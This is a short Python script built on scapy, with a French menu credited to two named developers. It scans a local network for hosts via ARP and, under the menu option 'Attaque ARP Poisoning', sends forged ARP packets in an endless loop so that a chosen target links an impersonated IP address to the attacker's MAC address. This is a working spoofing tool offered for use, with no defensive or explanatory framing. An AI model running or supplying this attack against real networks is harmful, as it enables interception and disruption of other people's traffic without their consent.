from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, get_if_list
from colorama import Back, Style, Fore, init
import time

init(autoreset=True)

banner = r"""
                                    .__                    .__                
_____ _____________   ______   ____ |__| __________   ____ |__| ____    ____  
\__  \\_  __ \____ \  \____ \ /  _ \|  |/  ___/  _ \ /    \|  |/    \  / ___\ 
 / __ \|  | \/  |_> > |  |_> >  <_> )  |\___ (  <_> )   |  \  |   |  \/ /_/  >
(____  /__|  |   __/  |   __/ \____/|__/____  >____/|___|  /__|___|  /\___  / 
     \/      |__|     |__|                  \/           \/        \//_____/  
"""


print(Back.GREEN + Style.BRIGHT + banner)
print("Développé par : NADE Fabrice & KOFFI Ange\n")

menu = """
===================================
                MENU
===================================

# 1. Détection des hôtes sur le réseau.
# 2. Attaque ARP Poisoning.
# 3. Quitter.

Choisissez une opération : """

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac

def host_detection(network):
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcasting to all devices
    packet = ether / arp

    result = srp(packet, timeout=3, verbose=0)[0]
    
    print("\n")
    for sent, received in result:
        print(Fore.GREEN + "IP Address: " + received.psrc + " MAC Address: " + received.hwsrc)
    print("\n")
    
def arp_poisonning_attack(target, impersonate):
    my_mac = get_mac_address()
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=impersonate,pdst=target)
    sendp(packet, loop=1, inter=0.2)

choice = input(menu)

if (choice == "1"):
    network = input("Adresse réseau à scanner (Ex : 192.168.1.0/24) : ")
    host_detection(network)
elif (choice == "2"):
    target = input("Adresse IP de la cible : ")
    impersonate = input("IP à usurpé : ")
    arp_poisonning_attack(target, impersonate)